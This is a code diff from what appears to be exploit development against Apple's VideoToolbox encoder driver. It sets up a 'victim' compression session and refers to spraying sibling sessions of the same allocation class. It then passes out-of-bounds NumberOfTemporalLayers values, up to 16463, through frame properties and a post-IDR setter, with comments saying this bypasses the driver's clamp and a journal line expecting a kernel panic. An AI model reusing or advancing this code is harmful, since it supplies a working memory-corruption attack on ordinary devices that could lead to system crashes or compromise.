@@ -121,7 +121,7 @@
     //    POST shows the real value). Encode is forced regardless of readback.
     NSDictionary *vspec = @{
         @"EncoderUsage": @1,
-        @"NumberOfTemporalLayers": @(self.ntl),
+        @"NumberOfTemporalLayers": @3,
         @"AllowTemporalCompression": @YES,
     };
     VTCompressionSessionRef victim = NULL;
@@ -135,13 +135,12 @@
     }
     int ntl = self.ntl;
     VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
-    // Rate-ratio recipe (analyst 214237): NTL appears validated against
-    // ExpectedFrameRate/BaseLayerFrameRate - spec[0..3] held NTL=3 with 60/15.
-    // Scale EFR with N so the ratio covers the requested layer count.
+    // Analyst 221032: the session sits at LEGAL NTL=3 (m0 recipe, POST=3
+    // UNCLAMPED). The OOB NTL rides in FRAME PROPERTIES (path-ii), which
+    // returned encode=0 in the post-prepare smash and bypasses the clamp.
     VTSessionSetProperty(victim, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
     VTSessionSetProperty(victim, CFSTR("RealTime"), kCFBooleanTrue);
-    int vEfr = ntl * 15;
-    VTSessionSetProperty(victim, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@(vEfr));
+    VTSessionSetProperty(victim, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
     VTSessionSetProperty(victim, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
     VTSessionSetProperty(victim, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
     OSStatus vprep = VTCompressionSessionPrepareToEncodeFrames(victim);
@@ -153,7 +152,7 @@
     }
     [self journal:[NSString stringWithFormat:@"VICTIM_READY ntl=%d prepare=%d readback_POST=%d",
                    ntl, (int)vprep, vrb]];
-    [report appendFormat:@"victim NTL POST-prepare readback=%d (want %d) — encode forced regardless\n",
+    [report appendFormat:@"victim base NTL POST-prepare readback=%d (want 3); OOB shots carry NTL=%d via frameProps\n",
      vrb, ntl];
 
     // 2) SPRAY siblings — same driver, same pInfo allocation class.
@@ -272,7 +271,29 @@
     CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
     [self journal:[NSString stringWithFormat:@"BEFORE_VICTIM_ENCODE ntl=%d (panic expected; far shows the consumed bytes)", ntl]];
     if (pb) {
+        // shot 0: clean IDR at legal NTL=3 (fills the encoder context)
         VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        VTCompressionSessionCompleteFrames(victim, kCMTimeInvalid);
+        // shot 1: path-ii - the OOB NTL in frameProperties
+        NSDictionary *shot1 = @{ @"NumberOfTemporalLayers": @(ntl) };
+        OSStatus s1 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(1, 30), kCMTimeInvalid,
+                                                      (__bridge CFDictionaryRef)shot1, NULL, NULL);
+        [report appendFormat:@"shot-ii frameProps NTL=%d -> %d\n", ntl, (int)s1];
+        // shot 2: post-IDR session setter (no re-prepare)
+        CFNumberRef sm = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+        OSStatus s2 = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), sm);
+        CFRelease(sm);
+        int postV = -1;
+        CFNumberRef rbv = NULL;
+        if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &rbv) == noErr && rbv) {
+            CFNumberGetValue(rbv, kCFNumberIntType, &postV); CFRelease(rbv);
+        }
+        [report appendFormat:@"shot-i post-IDR set=%d readback=%d\n", (int)s2, postV];
+        // shot 3: the panic rung in frameProperties
+        NSDictionary *shot3 = @{ @"NumberOfTemporalLayers": @16463 };
+        OSStatus s3 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(2, 30), kCMTimeInvalid,
+                                                      (__bridge CFDictionaryRef)shot3, NULL, NULL);
+        [report appendFormat:@"shot-iii frameProps NTL=16463 -> %d\n", (int)s3];
         VTCompressionSessionCompleteFrames(victim, kCMTimeInvalid);
     }
     [self journal:@"AFTER_VICTIM_ENCODE survived — no panic this time"];
